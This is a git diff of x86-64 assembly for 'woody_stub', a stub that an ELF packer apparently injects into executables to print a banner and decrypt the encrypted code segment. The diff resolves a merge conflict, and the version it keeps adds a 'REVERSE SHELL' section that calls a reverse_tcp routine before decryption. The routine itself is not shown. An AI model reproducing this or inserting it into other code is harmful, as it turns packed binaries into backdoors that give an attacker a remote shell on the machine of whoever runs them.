@@ -36,17 +36,6 @@ woody_stub:
     ; ========= "....WOODY...." ========== ;
     sys_write 1, r13, woody_message_len
 
-<<<<<<< HEAD
-    ; ========= DECRYPT CODE SEGMENT ========= ;
-    mov     r8, [rel tea_key]      
-    mov     r9, [rel tea_key + 8]   
-
-    lea     rdi, [rel woody_stub]
-    sub     rdi, [rel injection_point_stub]
-    add     rdi, [rel code_segment_vaddr_stub]
-    mov     rsi, [rel code_segment_size]
-    ; call    decrypt_code_segment
-=======
     ; ========= REVERSE SHELL ========= ;
     call    reverse_tcp
 
@@ -59,7 +48,6 @@ woody_stub:
     add     rdi, [rel code_segment_vaddr_stub]  ; 0X55555555000 -> Code segment
     mov     rsi, [rel code_segment_size]        ; 0x175
     call    decrypt_code_segment
->>>>>>> 9621cde
     
     add     rsp, 8
     pop     r9 
